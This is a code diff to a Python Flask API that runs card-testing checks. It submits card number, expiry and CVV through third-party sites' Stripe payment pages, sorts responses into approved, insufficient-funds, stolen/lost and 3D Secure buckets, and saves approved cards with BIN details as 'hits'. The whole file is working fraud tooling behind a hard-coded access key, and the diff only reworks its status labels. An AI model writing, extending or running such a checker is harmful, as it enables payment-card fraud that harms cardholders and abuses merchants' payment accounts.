@@ -104,7 +104,6 @@ class StripeAuthCheckerExact:
             'check_id': check_id,
             'card': f"{cc}|{exp_month}|{exp_year}|{cvv}",
             'status': 'UNKNOWN',
-            'response': 'UNKNOWN',
             'message': '',
             'gateway': 'STRIPE AUTH',
             'bin_info': {},
@@ -140,8 +139,7 @@ class StripeAuthCheckerExact:
             print(f"[{check_id}] Response status: {response.status_code}")
             
             if response.status_code != 200:
-                result['response'] = 'DECLINED'
-                result['status'] = 'DECLINED'
+                result['status'] = 'ERROR'
                 result['message'] = f'Failed to get payment page: {response.status_code}'
                 return result
             
@@ -150,8 +148,7 @@ class StripeAuthCheckerExact:
             print(f"[{check_id}] Extracted nonce: {self.n}")
             
             if not self.n:
-                result['response'] = 'DECLINED'
-                result['status'] = 'DECLINED'
+                result['status'] = 'ERROR'
                 result['message'] = 'Failed to extract nonce'
                 return result
             
@@ -170,8 +167,7 @@ class StripeAuthCheckerExact:
             # Create payment method with Stripe API
             print(f"[{check_id}] Step 5: Creating payment method...")
             if not self._create_payment_method(cc, cvv, exp_month, exp_year):
-                result['response'] = 'DECLINED'
-                result['status'] = 'DECLINED'
+                result['status'] = 'ERROR'
                 result['message'] = 'Failed to create payment method'
                 return result
             
@@ -201,49 +197,38 @@ class StripeAuthCheckerExact:
             self.message = message
             self.st = self.status
             
-            # Check card status with new format
-            card_response, card_status, card_message = self._check_card_status_new_format()
-            
-            result['response'] = card_response
+            # Check card status
+            card_status = self._check_card_status()
             result['status'] = card_status
-            result['message'] = card_message
+            result['message'] = self.message or ''
             
             # If we still don't have a clear status, try to determine from the raw response
-            if card_response == 'UNKNOWN' and not card_message:
+            if card_status == 'UNKNOWN' and not self.message:
                 print(f"[{check_id}] No clear status found, checking raw response...")
                 # Try to get the last response from setup intent
                 if hasattr(self, '_last_setup_response'):
-                    raw_response = self._check_card_status_from_raw_new(self._last_setup_response)
-                    if raw_response != 'UNKNOWN':
-                        if raw_response == 'APPROVED':
-                            result['response'] = 'APPROVED'
-                            result['status'] = 'APPROVED'
-                            result['message'] = 'Payment method added successfully'
-                        else:
-                            result['response'] = 'DECLINED'
-                            result['status'] = 'DECLINED'
-                            result['message'] = 'Your card was declined'
-                        print(f"[{check_id}] Determined status from raw response: {raw_response}")
+                    raw_status = self._check_card_status_from_raw(self._last_setup_response)
+                    if raw_status != 'UNKNOWN':
+                        result['status'] = raw_status
+                        print(f"[{check_id}] Determined status from raw response: {raw_status}")
                 
                 # If still unknown, try simple validation based on payment method creation
-                if result['response'] == 'UNKNOWN':
+                if result['status'] == 'UNKNOWN':
                     print(f"[{check_id}] Trying simple validation based on payment method creation...")
                     if self.id:
-                        result['response'] = 'APPROVED'
-                        result['status'] = 'APPROVED'
-                        result['message'] = 'Payment method added successfully'
+                        result['status'] = 'SUCCESS'
+                        result['message'] = 'Payment method created successfully'
                         print(f"[{check_id}] Card appears to be valid based on successful payment method creation")
             
-            # If approved, get BIN info
-            if card_response == 'APPROVED':
+            # If successful, get BIN info
+            if card_status == 'SUCCESS':
                 result['bin_info'] = self._get_bin_info(cc)
                 self._save_hit(result)
             
             return result
             
         except Exception as e:
-            result['response'] = 'DECLINED'
-            result['status'] = 'DECLINED'
+            result['status'] = 'ERROR'
             result['message'] = f"Exception: {str(e)}"
             return result
     
@@ -677,12 +662,12 @@ class StripeAuthCheckerExact:
             print(f"Error in alternative setup intent: {e}")
             return "", "", ""
     
-    def _check_card_status_new_format(self) -> Tuple[str, str, str]:
-        """Check card status with new format: response, status, message"""
+    def _check_card_status(self) -> str:
+        """Check card status based on response patterns"""
         response_text = f"{self.status} {self.success} {self.message}"
         
-        # Approved patterns
-        approved_patterns = [
+        # Success patterns
+        success_patterns = [
             '"status": "succeeded"',
             'result":"success',
             'status":"success',
@@ -693,15 +678,11 @@ class StripeAuthCheckerExact:
             'succeeded',
             'Succeeded',
             'true',  # JSON boolean success
-            'True',   # JSON boolean success
-            'setup_intent.client_secret',
-            'requires_action',
-            'requires_confirmation',
-            'processing'
+            'True'   # JSON boolean success
         ]
         
-        # Declined patterns (including 3D Secure as declined)
-        declined_patterns = [
+        # Failure patterns
+        failure_patterns = [
             'Your card number is incorrect.',
             'Your card has expired',
             'expired_card',
@@ -724,41 +705,50 @@ class StripeAuthCheckerExact:
             '"cvc_check": "unchecked"',
             'declined_by_network',
             '"cvc_check": fail',
-            'We\'re not able to add this payment method. Please refresh the page and try again',
-            'three_d_secure_redirect',  # 3D Secure
-            'stripe_3ds2_fingerprint',  # 3D Secure
-            'requires_action',  # 3D Secure
-            'requires_confirmation',  # 3D Secure
+            'We\'re not able to add this payment method. Please refresh the page and try again'
+        ]
+        
+        # CCN patterns
+        ccn_patterns = [
             'Your card has insufficient funds.',
             'Your card\'s security code is incorrect',
-            'Your card does not support this type of purchase',
+            'Your card does not support this type of purchase'
+        ]
+        
+        # NFS patterns
+        nfs_patterns = [
             'stolen_card',
             'lost_card'
         ]
         
-        # Check for approved patterns first
-        for pattern in approved_patterns:
-            if pattern.lower() in response_text.lower():
-                # Double-check if it's actually a declined pattern
-                is_declined = False
-                for decline_pattern in declined_patterns:
-                    if decline_pattern.lower() in response_text.lower():
-                        is_declined = True
-                        break
-                
-                if not is_declined:
-                    return "APPROVED", "APPROVED", "Payment method added successfully"
+        # 3D Secure patterns
+        secure_patterns = [
+            'three_d_secure_redirect',
+            'stripe_3ds2_fingerprint'
+        ]
         
-        # Check for declined patterns
-        for pattern in declined_patterns:
-            if pattern.lower() in response_text.lower():
-                return "DECLINED", "DECLINED", "Your card was declined"
+        # Check patterns
+        for pattern in success_patterns:
+            if pattern in response_text:
+                return "SUCCESS"
         
-        # If payment method was created successfully but no clear response
-        if self.id:
-            return "APPROVED", "APPROVED", "Payment method added successfully"
+        for pattern in ccn_patterns:
+            if pattern in response_text:
+                return "CCN"
         
-        return "UNKNOWN", "UNKNOWN", ""
+        for pattern in nfs_patterns:
+            if pattern in response_text:
+                return "NFS"
+        
+        for pattern in secure_patterns:
+            if pattern in response_text:
+                return "3DSECURE"
+        
+        for pattern in failure_patterns:
+            if pattern in response_text:
+                return "FAILURE"
+        
+        return "UNKNOWN"
     
     def _get_bin_info(self, cc: str) -> Dict[str, str]:
         """Get BIN information"""
@@ -807,9 +797,8 @@ class StripeAuthCheckerExact:
             with open(filename, 'a', encoding='utf-8') as f:
                 f.write("------------------------------------------------------\n\n")
                 f.write(f"CC:- {result['card']}\n\n")
-                f.write(f"RESPONSE:- APPROVED ✅\n")
-                f.write(f"STATUS:- APPROVED ✅\n")
-                f.write(f"MESSAGE:- {result['message']}\n")
+                f.write(f"MESSAGE:- CARD APPROVED ✅\n")
+                f.write(f"STATUS:- {result['status']}\n")
                 f.write(f"GATEWAY:- STRIPE AUTH ✅\n\n")
                 f.write("-----------------BIN INFO---------------------\n\n")
                 
@@ -848,62 +837,34 @@ class StripeAuthCheckerExact:
         except Exception as e:
             print(f"Error getting nonce from payment page: {e}")
     
-    def _check_card_status_from_raw_new(self, response_text: str) -> str:
-        """Check card status from raw response text with new format"""
+    def _check_card_status_from_raw(self, response_text: str) -> str:
+        """Check card status from raw response text"""
         try:
             # Try to parse as JSON first
             try:
                 json_data = json.loads(response_text)
                 if json_data.get('success') == True:
-                    return 'APPROVED'
+                    return 'SUCCESS'
                 elif json_data.get('success') == False:
-                    return 'DECLINED'
+                    return 'FAILURE'
                 if json_data.get('status') == 'succeeded':
-                    return 'APPROVED'
+                    return 'SUCCESS'
                 elif json_data.get('status') == 'failed':
-                    return 'DECLINED'
+                    return 'FAILURE'
             except:
                 pass
             
             # Check for common patterns in the response
-            response_lower = response_text.lower()
-            
-            # Approved patterns
-            approved_patterns = [
-                'succeeded',
-                'success',
-                'true',
-                'setup_intent',
-                'requires_action',
-                'requires_confirmation',
-                'processing'
-            ]
-            
-            # Declined patterns (including 3D Secure)
-            declined_patterns = [
-                'failed',
-                'declined',
-                'error',
-                'expired',
-                'incorrect',
-                'invalid',
-                'three_d_secure',
-                '3ds',
-                'insufficient',
-                'stolen',
-                'lost',
-                'fraudulent'
-            ]
-            
-            # Check for declined first (since 3D Secure should show as declined)
-            for pattern in declined_patterns:
-                if pattern in response_lower:
-                    return 'DECLINED'
-            
-            # Check for approved
-            for pattern in approved_patterns:
-                if pattern in response_lower:
-                    return 'APPROVED'
+            if 'succeeded' in response_text.lower():
+                return 'SUCCESS'
+            elif 'failed' in response_text.lower():
+                return 'FAILURE'
+            elif 'declined' in response_text.lower():
+                return 'FAILURE'
+            elif 'error' in response_text.lower():
+                return 'FAILURE'
+            elif 'success' in response_text.lower():
+                return 'SUCCESS'
             
             return 'UNKNOWN'
         except Exception as e:
@@ -927,12 +888,15 @@ def home():
             'cc': 'Card details in format: cardno|mm|yy|cvv or cardno|mm|yyyy|cvv'
         },
         'example': '/gateway=wizautostripe/key=blazealways/site=example.com/cc=4242424242424242|12|2025|123',
-        'response_format': {
-            'response': 'APPROVED or DECLINED',
-            'status': 'APPROVED or DECLINED',
-            'message': 'Detailed message about the result'
-        },
-        'notes': '3D Secure cards will show as DECLINED'
+        'status_codes': {
+            'SUCCESS': 'Card approved',
+            'FAILURE': 'Card declined',
+            'CCN': 'Card requires additional verification',
+            'NFS': 'Not for sale',
+            '3DSECURE': '3D Secure required',
+            'ERROR': 'Processing error',
+            'UNKNOWN': 'Unknown status'
+        }
     })
 
 
@@ -943,7 +907,6 @@ def check_stripe_auth(site, cc_details):
     # Check for API key authentication
     if request.args.get('key') != 'blazealways' and 'key=blazealways' not in request.path:
         return jsonify({
-            'response': 'ERROR',
             'status': 'ERROR',
             'message': 'Invalid API key',
             'gateway': 'STRIPE AUTH'
@@ -952,7 +915,6 @@ def check_stripe_auth(site, cc_details):
     # Check for gateway parameter
     if 'gateway=wizautostripe' not in request.path:
         return jsonify({
-            'response': 'ERROR',
             'status': 'ERROR',
             'message': 'Invalid gateway parameter',
             'gateway': 'STRIPE AUTH'
@@ -968,7 +930,6 @@ def check_stripe_auth(site, cc_details):
         
         if len(parts) != 4:
             return jsonify({
-                'response': 'ERROR',
                 'status': 'ERROR',
                 'message': 'Invalid card format. Use: cardno|mm|yy|cvv or cardno|mm|yyyy|cvv',
                 'gateway': 'STRIPE AUTH'
@@ -985,7 +946,6 @@ def check_stripe_auth(site, cc_details):
         # Validate card number
         if not cc.isdigit() or len(cc) < 13 or len(cc) > 19:
             return jsonify({
-                'response': 'ERROR',
                 'status': 'ERROR',
                 'message': 'Invalid card number',
                 'gateway': 'STRIPE AUTH'
@@ -999,7 +959,6 @@ def check_stripe_auth(site, cc_details):
             exp_year = str(century + int(exp_year))
         elif len(exp_year) != 4:
             return jsonify({
-                'response': 'ERROR',
                 'status': 'ERROR',
                 'message': 'Invalid year format. Use YY or YYYY',
                 'gateway': 'STRIPE AUTH'
@@ -1008,7 +967,6 @@ def check_stripe_auth(site, cc_details):
         # Validate expiration month
         if not exp_month.isdigit() or int(exp_month) < 1 or int(exp_month) > 12:
             return jsonify({
-                'response': 'ERROR',
                 'status': 'ERROR',
                 'message': 'Invalid expiration month',
                 'gateway': 'STRIPE AUTH'
@@ -1017,7 +975,6 @@ def check_stripe_auth(site, cc_details):
         # Validate CVV
         if not cvv.isdigit() or len(cvv) < 3 or len(cvv) > 4:
             return jsonify({
-                'response': 'ERROR',
                 'status': 'ERROR',
                 'message': 'Invalid CVV',
                 'gateway': 'STRIPE AUTH'
@@ -1026,7 +983,6 @@ def check_stripe_auth(site, cc_details):
         # Check if site URL is valid
         if not site or '/' in site or 'http' in site.lower():
             return jsonify({
-                'response': 'ERROR',
                 'status': 'ERROR',
                 'message': 'Invalid site URL. Do not include http:// or https://',
                 'gateway': 'STRIPE AUTH'
@@ -1039,7 +995,6 @@ def check_stripe_auth(site, cc_details):
         with check_lock:
             if check_id in active_checks:
                 return jsonify({
-                    'response': 'ERROR',
                     'status': 'ERROR',
                     'message': 'Card check already in progress',
                     'check_id': check_id,
@@ -1063,16 +1018,6 @@ def check_stripe_auth(site, cc_details):
             masked_card = f"{cc[:4]}****{cc[-4:]}"
             result['card_masked'] = masked_card
             
-            # Ensure response format is correct
-            if result['response'] == 'APPROVED':
-                result['status'] = 'APPROVED'
-                if not result['message'] or 'payment method added' not in result['message'].lower():
-                    result['message'] = 'Payment method added successfully'
-            elif result['response'] == 'DECLINED':
-                result['status'] = 'DECLINED'
-                if not result['message'] or 'card was declined' not in result['message'].lower():
-                    result['message'] = 'Your card was declined'
-            
             # Clean up
             with check_lock:
                 if check_id in active_checks:
@@ -1087,7 +1032,6 @@ def check_stripe_auth(site, cc_details):
                     del active_checks[check_id]
             
             return jsonify({
-                'response': 'ERROR',
                 'status': 'ERROR',
                 'message': f'Check failed: {str(e)}',
                 'check_id': check_id,
@@ -1096,7 +1040,6 @@ def check_stripe_auth(site, cc_details):
             
     except Exception as e:
         return jsonify({
-            'response': 'ERROR',
             'status': 'ERROR',
             'message': f'Invalid request: {str(e)}',
             'gateway': 'STRIPE AUTH'
@@ -1124,5 +1067,5 @@ def health_check():
 
 
 if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 7700))
+    port = int(os.environ.get('PORT', 5500))
     app.run(host='0.0.0.0', port=port, debug=False)
